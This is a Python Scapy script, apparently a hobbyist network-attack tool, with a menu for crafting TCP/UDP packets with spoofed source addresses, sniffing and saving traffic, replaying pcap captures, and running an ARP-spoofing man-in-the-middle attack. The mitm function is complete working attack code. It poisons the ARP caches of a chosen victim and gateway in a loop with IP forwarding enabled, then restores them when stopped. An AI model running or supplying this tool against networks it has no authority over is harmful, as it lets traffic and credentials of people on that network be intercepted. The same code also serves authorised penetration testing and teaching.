from scapy.all import *
from tqdm import tqdm
import time, os, ctypes


def main(): 
    #Main Menu
    """"""
    
    clear_screen()
    banners('menubanner')

    opt = input("\n\n 1. Create/Send TCP\n\n"
                   +" 2. Create/Send UDP\n\n"
                   +" 3. Sniff Network Traffic\n\n"
                   +" 4. MITM ARP Spoofing (Linux Only)\n\n"
                   +" 5. Replay .pcap \n\n"
                   +" 6. Exit\n\n\n"
                   + YELLOW + "[+] Select an option (1,2,3,4,5,6): " + RESET)
    match (opt):
        case "1":
            sendtcp()
        case "2":
            sendup()
        case "3":
             sniffing()
        case "4":
             mitm()   
        case "5":
             replay()    
        case "6":
            print(ORANGE + "\nExiting..." + RESET)
            sys.exit()
        
        case _: 
            print(RED + "\n[!] Invalid option selected [!]" + RESET)
            time.sleep(2)
            clear_screen()
            main()

# Colors to use in print
RED = "\033[31m"
GREEN = "\x1b[38;5;83m"
YELLOW = "\x1b[38;5;226m"
ORANGE = "\033[38;5;208m"
BLUE = "\033[34m"
PURPLE = "\x1b[38;5;93m"
RESET = "\033[0m"

# Check if the user is admin or root

def isadmin(system):
    if system == 'nt':
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print(RED + "\n[!] This script must be run as Administrator [!]\n" + RESET)
            sys.exit()
    else:
        if not os.geteuid() == 0:
            print(RED + "\n[!] This script must be run as root [!]\n" + RESET)
            sys.exit()

# Clear screen on Windows and Unix
def clear_screen():
    if  system == 'nt':
        os.system('cls')
    else:
        os.system('clear')

#Create and Reset an error counter
errors = 0        
def reset_error_counter():
    global errors
    errors = 0

def error_counter():
    global errors
    errors += 1
    return(errors)


def validateip(ip):

    # Check that is a valid IP 
    patron = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'

    if re.match(patron, ip):

        segmentos = ip.split('.')
        for segmento in segmentos:
            if 0 <= int(segmento) <= 255:
                continue
            else:
                return False
        return True
    else:
        return False
    
def validateport(port):

    # Check that is a valid PORT 
    if "." in port:  
        return False
    try:
        port_number = int(port)
        if 0 <= port_number <= 65535:
            return True
        else:
            return False
    except ValueError:
        return False

def filexists():
    clear_screen()
    
    while True:
        banners('replaybanner')
        print(BLUE + "\n\n[!] If you get errors while replaying, try using Windows [!] " + RESET)
        filename = input("\n\n[+] Supply the .pcap file name (Include path if needed): ")
        
        # Verify that the file exists and has the correct extension
        if os.path.exists(filename) and filename.lower().endswith(".pcap"):
            return filename
        else:
            print(RED + f"\n[!] {filename} doesn't exist or is not a .pcap file. [!]" + RESET)
            time.sleep(2)
            clear_screen()

def currifaces():

    if  system == 'nt':
        ifaces = subprocess.check_output(['powershell', '-c', '(Get-NetIPAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress)'])
        ifaces = ifaces.decode('utf-8', errors='ignore')

    else:
        ifaces = subprocess.check_output('ifconfig | grep -E "^[a-z0-9]+:|inet " | awk \'{ if ($1 ~ /^[a-z0-9]+:$/) printf $1 " "; else print $2 }\' | cut -d ":" -f1,2', shell=True)
        ifaces = ifaces.decode().strip()

    return ifaces

def enable_disable_forwarding(value):
    os.system("sysctl -w net.ipv4.ip_forward={} 1>/dev/null".format(value))


def commonparameters():
    
    # Mandatory parameters for TCP/UDP packets
    clear_screen()
    banners('packetbanner')

    dst_ip = input("\nDestination IP: ")
    while not validateip(dst_ip):
        clear_screen()
        banners('packetbanner')
        print("\n[!] Enter a valid IP [!]")
        dst_ip = input("\nDestination IP: ")


    dst_port = input("\nDestination port: ")
    while not validateport(dst_port):
        clear_screen()
        banners('packetbanner')
        print(RED +"\n[!] Enter a valid port [!]"+ RESET)
        dst_port = input("\nDestination port: ") 

    src_ip = input("\nSource IP (Enter = Default interface): ")
    if  src_ip:
        while not validateip(src_ip):
            clear_screen()
            banners('packetbanner')
            print(RED +"\n[!] Enter a valid IP [!]" + RESET)
            src_ip = input("\nSource IP: ")
    else:
        src_ip = "Default"

    src_port = input("\nSource port: ")
    while not validateport(src_port):
        clear_screen()
        banners('packetbanner')
        print(RED +"\n[!] Enter a valid port number [!]"+ RESET)
        src_port = input("\nSource port: ")

    content = input("\nPacket content: ")

    return(src_ip,dst_ip,src_port,dst_port,content)

def sendtcp():
    
    common = commonparameters()
    src_ip,dst_ip,src_port,dst_port,content = common
    src_port=int(src_port)
    dst_port=int(dst_port)

    # Configure Aditional Parameters
    clear_screen()
    banners('tcpbanner')
    additional = input("Do you want to configure other custom values (Seq Number, ACK, IP ID and Flag value)? (Y/N): ")
    while not (additional.upper() == 'Y' or additional.upper() == 'N'):
        additional = input("Do you want to configure other custom values (Seq Number, ACK, IP ID and Flag value)? (Y/N): ")
       

    if additional.upper() == "Y":
        seq_n_str = input("\nSet sequency number (Enter = Default Value): ")
        if not seq_n_str:
            seq_n = 0
        else:
            seq_n = int(seq_n_str)

        ack_n_str = input("\nSet ACK (Enter = Default Value): ")
        if not ack_n_str:
            ack_n = 0
        else:
            ack_n = int(ack_n_str)

        ipid_str = input("\nSet IP ID Value (Enter = Default Value): ")
        if not ipid_str:
            ipid = 1
        else:
            ipid = int(ipid_str)

        flags_str = input("\nSet FLAG value (Enter = Default Value): ")
        if not flags_str:
            pflags = int("010")
        else:
            pflags = int(flags_str)
    else: 
        seq_n = 0
        ack_n = 0
        ipid = 1
        pflags = int("010")

    # Build packet
    if src_ip == "Default": # If the user has selected Default IP, we use the default interface.
        ip = IP(dst=dst_ip, id=ipid, flags=pflags)
    else:
        ip = IP(src=src_ip, dst=dst_ip, id=ipid, flags=pflags)
    
    tcp = ip / TCP(sport=src_port, dport=dst_port, flags='PA', seq=seq_n, ack=ack_n) / content

    clear_screen()
    print (ORANGE + "#### Final TCP Packet Preview ####\n\n" + RESET)
    tcp.display()
    print("length of the packet {}".format(len(tcp)))
    
    # Confirm if want to send the packet
    confirm = input(YELLOW + "\n\nSend the custom packet? (Y/N): " + RESET)
    while not (confirm.upper() == 'Y' or confirm.upper() == 'N'):
        confirm = input(YELLOW + "\n\nSend the custom packet? (Y/N): " + RESET)

    if confirm.upper() == 'Y':
        try:  
            clear_screen()
            response = sr1(tcp,timeout=5) # Send the packet and save the response
            print(YELLOW + "\n\n[+] Printing Answers [+]\n" + RESET)
            time.sleep(3)
            if not response: # If ther's no response.
                print(RED + "\n[!] Dind´t get any response [!]" + RESET)
            else:
                response.show() # Show response
                input(BLUE + "\n[+] Press Enter to continue [+]" + RESET)

        except ValueError:
            print(RED + f"[!] An error occurred, the packet wasn´t sent: [!]" + RESET)

    # Return to Main
    print(ORANGE + "\n\n[+] Returning to main menu ..." + RESET)
    time.sleep(3)
    main()
        

def sendup(): # Send UDP 

    common = commonparameters()
    src_ip,dst_ip,src_port,dst_port,content = common
    src_port=int(src_port)
    dst_port=int(dst_port)

    # Build packet
    if src_ip == "Default": # If the user has selected Default IP, we use the default interface.  
        ip = IP(dst=dst_ip)
    else:
        ip = IP(src=src_ip, dst=dst_ip)

    udp = ip / UDP(sport=src_port, dport=dst_port) / content
    
    
    clear_screen()
    print (ORANGE + "#### Final UDP Packet Preview ####\n\n" + RESET)
    udp.display()
    print("length of packet {}".format(len(udp)))
    
    # Confirm if want to send the packet
    confirm = input(YELLOW + "\n\nDo you want to send the custom packet? (Y/N): " + RESET)
    while not (confirm.upper() == 'Y' or confirm.upper() == 'N'):
        confirm = input(YELLOW + "\n\nDo you want to send the custom packet? (Y/N): " + RESET)
    
    if confirm.upper() == 'Y':
        try:  
            clear_screen()
            response = sr1(udp,timeout=5) # Send the packet and save the response
            print("\n\n[+] Printing Answers [+]\n")
            time.sleep(3)
            if not response: # If ther's no response.
                print(RED + "\n[!] Dind´t get any response [!]" + RESET)
            else:
                response.show() # Show response
                input(BLUE + "\n[+] Press Enter to continue [+]" + RESET)

        except ValueError:
            print(RED + f"[!] An error occurred, the packet wasn´t sent: " + RESET)

    # Return to Main
    print(ORANGE + "\n\n[+] Returning to Main..." + RESET)
    time.sleep(3)
    main()

def sniffing():

    clear_screen()
    banners('snifferbanner')
    print(YELLOW + "\n [+] Current Interfaces [+]\n" + RESET)
    print(currifaces())

    interfaces = input(GREEN + "\nProvide the inferface name separated by comma (Enter = Use default interface): " + RESET) # Ask for interfaces
    
    set_filter = input("\nDo you want to apply a custom filter Y/N: ") # Ask for custom filters.
    while not (set_filter.upper() == 'Y' or set_filter.upper() == 'N'):
        clear_screen()
        banners('snifferbanner')
        set_filter = input("Do you want to apply a custom filter Y/N: ")

    if set_filter.upper() == 'Y': # Info related to filters and user filter setup.
        clear_screen()
        banners('snifferbanner')
        print("\nWe don´t provide any filter presets, refer to scapy manual for more information.")
        print("\nSome examples are the following:\n\n 1. Example: tcp and ( port 25 or port 110 )\n\n 2. Example: host 64.233.167.99 \n\n 3. Example: host 1.2.3.4 and port 80")
        set_filter = input("\n\nType your custom filter here: ")
        clear_screen()
    else:
        set_filter = ""
        clear_screen()

    while True: # Select amount of packets to capture
        banners('snifferbanner')
        print( YELLOW + "\n[+] Press CTRL + C to stop capturing before reaching the selected amount of packets [+]" + RESET) 
        amount = input("\nChoose the amount of packets to capture (Enter = 200): ")

        if amount == "":
            amount = 200
            break  
        try:
            amount = int(amount)
            break 
        except ValueError:
            print(RED + "\n[!] Invalid number, enter a valid number [!]. " + RESET)
    try:  # Handle errors
        print(GREEN + "\n[+] Starting to Capture... [+]\n" + RESET)
        if interfaces:
            interfaces_list = [interface.strip() for interface in interfaces.split(',')] # If there are more than 1 interfaces, split them.
            for interface in interfaces_list: # Create the listener for single and multiple interfaces, and with/without filters.
                packets = sniff(iface=interface, filter=set_filter, prn=lambda x: x.summary(), count=int(amount))
        else:
                packets = sniff(filter=set_filter, prn=lambda x: x.summary(), count=int(amount))
    except ValueError: # If the listener fails.
            print(RED + "\n[!] An error ocurred, the supplied filter or interfaces may be incorrect, also check you are running the program as root [!]" + RESET)
            print(ORANGE + "\n\n[+] Returning to main menu..." + RESET)
            time.sleep(5)
            main()

    save = input( YELLOW + "\n\n[+] Packet limit reached. Do you want to save the captured traffic? (Y/N): " + RESET) # Save the captured traffic 
    if save.upper() == 'Y':
     pcap = input("\n\n[+] Set the filename (Enter = default.pcap): ") # Create a .pcap file 
     try:
        if not pcap:
            wrpcap("default.pcap",packets)
            print(GREEN +"\n\n[+] Captured traffic saved at ./default.pcap" + RESET)
            time.sleep(3)
        else:
            wrpcap(pcap,packets)
            print(GREEN + "\n\n[+] Captured traffic saved at ./{}".format(pcap) + RESET)
            time.sleep(3)
            
     except ValueError: # Handle errors if the program doesn´t have enough rights to save the file.
        print(RED + "\n\n[!] An error happened wille saving the file, ensure you have enough privileges [!]" + RESET)
        print(ORANGE + "\n\n[+] Returning to main menu..." + RESET)
        time.sleep(5)
        main()

    print(ORANGE + "\n\n[+] Returning to main menu..." + RESET)
    time.sleep(5)
    main()

def replay():

    captured = filexists() # Ask for the file 
    pkts = rdpcap(captured) # Extract packets from .pcap
    num_repetitions = ''

    num_repetitions = input("\nHow many times do you want to repeat the packet sending process? Enter = 1: ")
    while not (num_repetitions.isdigit() or num_repetitions == ''):
        clear_screen()
        banners("replaybanner")
        print(RED + "\n[!] Please enter a valid integer number or press Enter. [!]" + RESET)
        num_repetitions = input("\nHow many times do you want to repeat the packet sending process? Enter = 1: ")
    
    if num_repetitions == '':
        num_repetitions = 1
    else:
        num_repetitions = int(num_repetitions)    


    timings = input("\nDo you want to replicate the original timings between packets? Y/N: ") # Ask if the user want's to respect the original timings.
    while not (timings.upper() == 'Y' or timings.upper() == 'N'):
        
        timings = input("\nDo you want to replicate the original timings between packets? Y/N: ")

    for _ in range(num_repetitions):
        clear_screen()
        print(YELLOW + "\n\n[+] Starting Replay: " + GREEN + str(_) + "\n\n" + RESET)

        if timings == "Y":
            # Access the first packet
            clk = float(pkts[0].time)
            # Use tqdm to create a progress bar
            for p in tqdm(pkts, desc="Relaying Packets", unit=" packet"):    
                # Convert Decimal to float
                time_diff = float(p.time) - clk # Calculate timings between packets
                time.sleep(time_diff) # Wait the calculated time.
                clk = float(p.time)
                try:
                    # Disable verbose mode to prevent "Sent 1 packets" output
                    sendp(p, verbose=0)
                except:
                    clear_screen()
                    print(RED + "\n [!] Error sending the packet: " + str(error_counter()) + " packets wheren´t sended [!]\n" + RESET)
        else:
            for p in tqdm(pkts, desc="Replaying Packets", unit=" packet"):
                try:
                    # Disable verbose mode to prevent "Sent 1 packets" output
                    sendp(p, verbose=0)
                except:
                    clear_screen()
                    print(RED + "\n [!] Error sending the packet: " + str(error_counter()) + " packets wheren´t sended [!]\n" + RESET)


    print(GREEN + "\n\n[+] Replay finished." + RESET)
    reset_error_counter()
    time.sleep(1)
    print(ORANGE + "\n\n[+] Returning to main menu..." + RESET)
    time.sleep(5)
    main()
       
def mitm():

    clear_screen()
    banners('mitmbanner')

    arp_restore_replies = 40

    #Print and ask to select interface:
    print(YELLOW + "\n [+] Current Interfaces [+]\n" + RESET)
    print(currifaces())

    interface = input(YELLOW + "\n Select interface (e.g. eth0): " + RESET) 

    #Ask for target IP
    t_ip = input(YELLOW + "\n Target IP: " + RESET)
    while not validateip(t_ip):
        clear_screen()
        banners('mitmbanner')
        print(RED + "\n[!] Enter a valid IP [!]" + RESET)
        t_ip = input(YELLOW + "\n Target IP: " + RESET)

    #Ask for gateway IP
    g_ip = input(YELLOW + "\n Gateway IP: " + RESET)
    while not validateip(g_ip):
        clear_screen()
        banners('mitmbanner')
        print( RED + "\n[!] Enter a valid IP [!]" + RESET)
        g_ip = input(YELLOW + "\n Gateway IP: " + RESET)

    #Enable forwarding
    clear_screen()
    banners('mitmbanner')    
    print(YELLOW + "\n[+] Enabling IP Forwarding..." + RESET)
    enable_disable_forwarding("1")

    #Function to resolve mac from IP
    def resolve_mac(ip):
        print(ORANGE + "\n[+] Sending ARP request to resolve {} via broadcast [+]".format(ip) + RESET)
        ans, uns = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=interface,verbose=0)
        return ans[0][1].src
    
    #Try to resolve MAC from (Target/Gateway)
    try:
        t_mac = resolve_mac(t_ip)
        print(GREEN + "\n" + t_mac + RESET)
        g_mac = resolve_mac(g_ip)
        print(GREEN + "\n" + g_mac + RESET)
        time.sleep(4)
    except IndexError:
        print(RED +"\n[!] Can't resolve IP address to MAC, exiting [!]" + RESET)
        print(GREEN + "\n[+] Disabling IP forwarding..." + RESET)
        enable_disable_forwarding("0")
        print(ORANGE + "\n\n[+] Returning to main menu..." + RESET)
        time.sleep(5)
        main()

    print(PURPLE + "\n[V] Starting ARP poisoning [V]" + RESET) 
    time.sleep(2)

    #Start/Finish ARP Spoofing
    while True:
        try:
            # Send spoofed ARP reply to victim with attacker MAC and gw IP as Sender MAC and IP 
            sendp(Ether(dst=t_mac)/ARP(hwlen=6, plen=4, op="is-at", hwdst=t_mac, psrc=g_ip, pdst=t_ip), iface=interface, verbose=0)

            # Send spoofed ARP reply to gateway with attacker MAC and victim IP as Sender MAC and IP 
            sendp(Ether(dst=g_mac)/ARP(hwlen=6, plen=4, op="is-at", hwdst=g_mac,psrc=t_ip, pdst=g_ip), iface=interface, verbose=0)
            
            clear_screen()
            banners('mitmbanner')
            print(GREEN + "ARP Spoofing Running -> Enjoy ;)" + RESET)
            
            print(YELLOW + "\n[+] " + str(error_counter()) + " Spoofing packets sended [+]\n" + RESET)
            time.sleep(2)

        except KeyboardInterrupt:
            print(YELLOW + "\n[+] Restoring ARP Tables [+]" + RESET)

            # Send ARP reply as broadcast with gateway MAC and gw IP as Sender MAC and IP
            sendp(Ether()/ARP(hwlen=6, plen=4, op="is-at", hwdst="ff:ff:ff:ff:ff:ff", psrc=g_ip, pdst=t_ip, hwsrc=g_mac), iface=interface, count=arp_restore_replies)

            # Send ARP reply as broadcast with victim MAC and IP as Sender MAC and IP
            sendp(Ether()/ARP(hwlen=6, plen=4, op="is-at", hwdst="ff:ff:ff:ff:ff:ff", psrc=t_ip, pdst=g_ip, hwsrc=t_mac), iface=interface, count=arp_restore_replies)
            time.sleep(1)
            print(GREEN + "\n[+] Disabling IP forwarding..." + RESET)
            enable_disable_forwarding("0")
            reset_error_counter()
            print(PURPLE + "\n\n[V] ARP MITM Poisoning finished [V]" + RESET)
            time.sleep(2)
            print(ORANGE + "\n\n[+] Returning to main menu..." + RESET)
            time.sleep(5)
            main()
            

# All banners
def banners(param):

    match (param):
        case "menubanner":
            print( ORANGE + """\

                        
                       ███████╗ ██████╗██████╗  █████╗ ██████╗ ██╗   ██╗
                       ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
  _._._._._._._._.|____███████╗██║_____██████╔╝███████║██████╔╝_╚████╔╝_______ 
  _#_#_#_#_#_#_#_#|____╚════██║██║_____██╔══██╗██╔══██║██╔═══╝___╚██╔╝_______/  
                  |    ███████║╚██████╗██║  ██║██║  ██║██║        ██║        *
                       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝       *  
                                                                             *
                                                                         """ + RED + "by @Slayer0x"+ RESET) 
        case "tcpbanner":
            print(ORANGE + "\n ##### TCP CUSTOM CONFIGURATION ##### \n" + RESET)

        case "packetbanner":
            print(ORANGE +"\n ##### PACKET CONFIGURATION ##### \n" + RESET)

        case "snifferbanner":
            print(ORANGE +"\n ##### SNIFFER CONFIGURATOR ##### \n" + RESET)

        case "replaybanner":
            print(ORANGE +"\n ##### REPLAY CONFIGURATOR ##### \n"+ RESET)
            
        case "mitmbanner":
            print(ORANGE +"\n ##### ARP SPOOFING MITM CONFIGURATOR ##### \n"+ RESET)
        case _: 
            print(RED + "\n [!] Invalid option selected [!]"+ RESET)
            time.sleep(2)
            clear_screen()
            main()        


if __name__ == '__main__':
    system = os.name
    isadmin(system)
    main()